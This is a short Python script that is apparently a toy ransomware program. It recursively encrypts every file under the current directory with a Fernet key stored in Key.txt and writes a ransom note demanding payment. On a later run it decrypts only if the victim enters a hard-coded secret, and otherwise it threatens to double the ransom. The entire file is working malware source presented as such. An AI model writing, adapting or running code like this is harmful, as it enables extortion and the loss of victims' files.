#!/usr/local/bin/python3

import os
from cryptography.fernet import Fernet


# Start encrypting/decrypting file from this directory. By default, it is set to current directory
ROOT_DIRECTORY = "."

# Files to ignore
IGNORE_LIST = ["main.py", 'Key.txt', 'DO NOT DELETE THIS FILE']

# Key used to verify decryption 
SECRET = "ThisIsSuperSecureKey"
key = ''

def encrypt():

    # Go to every file under the ROOT_DIRECTORY
    for (dir_path, dir_names, file_names) in os.walk(ROOT_DIRECTORY):
        for file in file_names:
            if file in IGNORE_LIST:
                continue    # do nothing for files in IGNORE_LIST
            
            filePath = dir_path + "/" + file

            # read content of a file, encrypt it and overwrite the encrypted content to the same file
            with open(filePath, 'rb') as f:
                content = f.read()
            with open(filePath, 'wb') as f:
                encryptedContent = Fernet(key).encrypt(content)
                f.write(encryptedContent)    
            

def decrypt():

    # Go to every file under the ROOT_DIRECTORY
    for (dir_path, dir_names, file_names) in os.walk(ROOT_DIRECTORY):
        for file in file_names:
            if file in IGNORE_LIST:
                continue    # do nothing for files in IGNORE_LIST
            
            filePath = dir_path + "/" + file

            # read content of encrypted file, decrypt it and overwrite the decrypted content to the same file
            with open(filePath, 'rb') as f:
                encryptedContent = f.read()
            with open(filePath, 'wb') as f:
                content = Fernet(key).decrypt(encryptedContent)
                f.write(content)
   
    # remove any file created during the process
    os.remove('Key.txt')
    os.remove('DO NOT DELETE THIS FILE')                
                    



if __name__ == '__main__':

    # if Key.txt file is present, then the program has already encrypted all the files.
    if os.path.exists("Key.txt"):
        msg = "If you've paid the ransom, then enter the secret below to get back your files. Else read the \'DO NOT DELETE THIS FILE\'"
        print(msg)
        secretKey = input("key: ")

        # if SECRET is known to victim, then they've paid ransomware and files can be decrypted
        if secretKey == SECRET:
            with open('Key.txt', 'rb') as f:
                key = f.read()
            decrypt()    
        else:
            print("Wrong Key! Your ransom will be doubled if you try to mess with us!")    
        
    else:   # Files will be encrypted and a symmetric key will be generated.
        key = Fernet.generate_key()
        with open('Key.txt', 'wb') as f:
            f.write(key)
        encrypt()    
        msg = '*' * 50
        msg += '\nAll your files have been encrypted! Pay $$ to us to decrypt your files.\n'
        msg += '*'* 50
        print(msg)
        with open('DO NOT DELETE THIS FILE', 'w') as f:
            f.write(msg)